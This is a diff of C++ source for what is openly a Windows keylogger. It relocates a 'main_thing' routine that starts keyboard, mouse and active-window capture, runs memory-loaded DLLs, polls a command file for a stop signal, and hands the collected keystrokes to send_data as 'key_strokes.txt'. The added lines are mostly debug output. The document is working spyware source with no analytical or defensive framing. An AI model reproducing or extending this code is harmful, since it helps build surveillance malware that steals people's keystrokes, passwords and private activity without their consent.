@@ -92,68 +92,6 @@ __declspec(dllexport) int target_init_KL(INIT_PARAMS* params)
     return 1;
 }
 
-int main_thing()
-{
-
-    std::atomic<bool> receivedTerminationSignal(false);
-
-    // Set the console control handler
-    if(!SetConsoleCtrlHandler(CtrlHandler, TRUE))
-    {
-        #if DEBUG
-        std::cerr << "Error setting console control handler" << std::endl;
-        #endif
-
-        return 0;
-    }
-
-    init_active_window(&shared_vector);
-    init_keyboard(&shared_vector);
-    init_mouse(&shared_vector);
-
-    std::thread terminationCheckThread([&]()
-    {
-        while(true)
-        {
-            std::string a = receive_data("klogger_cmd.txt");
-            if(a[0] == 's')
-            {
-                receivedTerminationSignal = true;
-                send_data("klogger_cmd.txt","`");
-
-                std::ostringstream oss;
-                for (const auto& entry : shared_vector) oss << entry;
-                send_data("key_strokes.txt",oss.str());
-
-                cleanup_kb();
-                cleanup_m();
-                cleanup_aw();
-                break; 
-            }
-            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
-        }
-    });
-    
-    // Main thread continues to process Windows messages
-    MSG msg;
-    while (!receivedTerminationSignal)
-    {
-        if(PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
-        {
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
-    }
-
-    terminationCheckThread.join();
-
-    pStruct->MemoryFreeLibrary(vpDLL_k);
-    pStruct->MemoryFreeLibrary(vpDLL_m);
-    pStruct->MemoryFreeLibrary(vpDLL_w);
-
-    return 1;
-}
-
 int load_dlls()
 {
 
@@ -270,6 +208,87 @@ int load_dlls()
 
     #if DEBUG
     std::cout << "Got all the module functions" << std::endl;
+    #endif
+
+    return 1;
+}
+
+int main_thing()
+{            
+    #if DEBUG
+    std::cout << "In main" << std::endl;
+    #endif
+
+    std::atomic<bool> receivedTerminationSignal(false);
+
+    // Set the console control handler
+    if(!SetConsoleCtrlHandler(CtrlHandler, TRUE))
+    {
+        #if DEBUG
+        std::cerr << "Error setting console control handler" << std::endl;
+        #endif
+
+        return 0;
+    }
+
+    init_active_window(&shared_vector);
+    init_keyboard(&shared_vector);
+    init_mouse(&shared_vector);
+
+    #if DEBUG
+    std::cout << "Every dll init done" << std::endl;
+    #endif
+
+    std::thread terminationCheckThread([&]()
+    {
+        while(true)
+        {
+            std::string a = receive_data("klogger_cmd.txt");
+            if(a[0] == 's')
+            {
+                receivedTerminationSignal = true;
+                send_data("klogger_cmd.txt","`");
+
+                std::ostringstream oss;
+                for (const auto& entry : shared_vector) oss << entry;
+                send_data("key_strokes.txt",oss.str());
+
+                cleanup_kb();
+                cleanup_m();
+                cleanup_aw();
+                break; 
+            }
+            #if DEBUG
+            std::cout << "Waiting for stop [Keylogger]" << std::endl;
+            #endif
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(1000)); 
+        }
+    });
+
+    #if DEBUG
+    std::cout << "thread done " << std::endl;
+    #endif
+    
+    // Main thread continues to process Windows messages
+    MSG msg;
+    while (!receivedTerminationSignal)
+    {
+        if(PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+
+    terminationCheckThread.join();
+
+    pStruct->MemoryFreeLibrary(vpDLL_k);
+    pStruct->MemoryFreeLibrary(vpDLL_m);
+    pStruct->MemoryFreeLibrary(vpDLL_w);
+
+    #if DEBUG
+    std::cout << "Freed dlls" << std::endl;
     #endif
 
     return 1;
